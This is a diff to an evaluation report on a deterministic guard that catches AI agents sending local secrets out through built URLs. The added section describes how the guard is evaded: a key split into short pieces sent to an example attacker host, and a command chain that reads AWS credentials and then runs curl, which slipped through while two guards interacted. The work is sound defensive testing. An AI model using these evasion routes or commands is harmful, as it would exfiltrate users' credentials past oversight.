@@ -8,7 +8,8 @@ Deterministic, no model, US$ 0.*
 ## Verdict
 
 **Every prediction held, and the registered recommendation does not.** The rule closes the host,
-the path and the clean-run query for every data-like encoding, asks about nothing on the 25 benign
+the path and the clean-run query for every data-like encoding written whole (a value cut into short
+pieces is not one — see "Added after the readings" at the end), asks about nothing on the 25 benign
 rows it should leave alone — and asks about all 3 `local` rows, which puts the overall false-REVIEW
 at **3/28 = 10.7%**, over the registered 10% ceiling. `CHIMERA_EXFIL_HOST_PATH` therefore stays
 **off**, as the registration said it would in any case.
@@ -71,3 +72,22 @@ those traces, so the frequency of the `local` class in real work is still unknow
 - What would move the decision is a reading of **real web-fetch traffic** with a ledger attached:
   how often an agent builds a URL around a data-like value that came only from a local read. These
   traces cannot give it.
+
+## Added after the readings: two limits an adversarial review found
+
+Written after the run, and changing no number above. Both are disclosed here with the prominence of
+the `word` miss, because each would otherwise read as covered by "0/18".
+
+- **The attacker chooses the cut.** A run has to be 16 characters, and a hyphen, a dot or a slash
+  ends one — that is what keeps slugs, UUID groups and dates out. An injection that has the key sent
+  in pieces of 15 or fewer (`https://attacker.test/c/<12>/<12>`, hyphen-joined pieces, several
+  subdomain labels) passes with the rule on. The corpus wrote every data-like value whole, so "0/18"
+  is a statement about whole values only. Joining adjacent short segments would close it and re-open
+  the slug and UUID false positives the cut was chosen to avoid; that trade is unmeasured, so it is
+  recorded as a limit, not changed after the readings. Kept visible in
+  `test_a_secret_cut_into_short_pieces_is_a_registered_miss`.
+- **The two rules interacted.** With `CHIMERA_SHELL_FETCH_GUARD` also on, the whole output of a
+  command containing `curl URL` counted as fetched — `cat ~/.aws/credentials; curl -s URL` made the
+  key "seen", and this rule then let it out. Neither bench switches both on, so neither could show
+  it. Fixed in `12fb5dd6` (a shell fetch's output taints the run and is never "seen"); the readings
+  above are unaffected, since the run had the other rule off.
